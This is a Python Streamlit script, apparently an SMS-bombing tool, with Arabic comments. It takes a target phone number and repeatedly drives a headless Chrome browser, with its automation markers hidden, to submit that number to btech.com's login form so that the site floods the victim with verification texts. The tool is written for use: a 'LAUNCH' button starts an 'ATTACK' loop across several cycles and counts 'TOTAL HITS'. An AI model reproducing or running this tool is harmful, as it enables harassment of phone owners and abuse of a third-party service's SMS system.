import streamlit as st
import threading
import time
import random # حل مشكلة الـ NameError
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# إعدادات الصفحة
st.set_page_config(page_title="GHOST SNIPER v8.0", page_icon="🚀")

# CSS لتحسين المظهر
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: #2ecc71; }
    .stButton>button { width: 100%; background-color: #27ae60; color: white; border-radius: 10px; }
    </style>
    """, unsafe_allow_html=True)

if 'count' not in st.session_state: st.session_state.count = 0
if 'logs' not in st.session_state: st.session_state.logs = []
if 'running' not in st.session_state: st.session_state.running = False

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 15: st.session_state.logs.pop(0)

def run_btech_cycle(phone, thread_id):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    # تمويه لإخفاء أنك روبوت
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_argument(f"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
    
    driver = None
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 15)
        
        driver.get("https://btech.com/ar/account")
        
        # الانتظار والضغط على دخول
        red_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'تسجيل دخول') or contains(., 'إنشاء حساب')]")))
        red_button.click()
        
        # إدخال الرقم
        phone_input = wait.until(EC.presence_of_element_located((By.ID, "phone")))
        phone_input.send_keys(phone)
        phone_input.send_keys("\ue007")
        
        time.sleep(2)
        st.session_state.count += 1
        add_log(f"Thread-{thread_id}: ✅ Success!")
    except Exception:
        add_log(f"Thread-{thread_id}: ❌ Busy or Blocked")
    finally:
        if driver: driver.quit()

# واجهة المستخدم
st.title("🚀 ULTIMATE SMS SNIPER")
phone = st.text_input("Target Number", placeholder="01xxxxxxxxx")
multiplier = st.selectbox("Threads Power", [1, 2, 3, 5, 10])

col1, col2 = st.columns(2)
if col1.button("🔥 LAUNCH"):
    st.session_state.running = True
    add_log(f"--- ATTACK STARTED ON {phone} ---")

if col2.button("🛑 STOP"):
    st.session_state.running = False
    add_log("--- STOPPED ---")

st.metric("TOTAL HITS", st.session_state.count)

# اللوجز (Terminal Style)
st.subheader("System Logs")
log_text = "\n".join(st.session_state.logs[::-1])
st.text_area(label="Logs", value=log_text, height=250, disabled=True, label_visibility="collapsed")

if st.session_state.running:
    # تشغيل الدورة بناءً على القوة المختارة
    for i in range(multiplier):
        run_btech_cycle(phone, i+1)
    time.sleep(1)
    st.rerun()
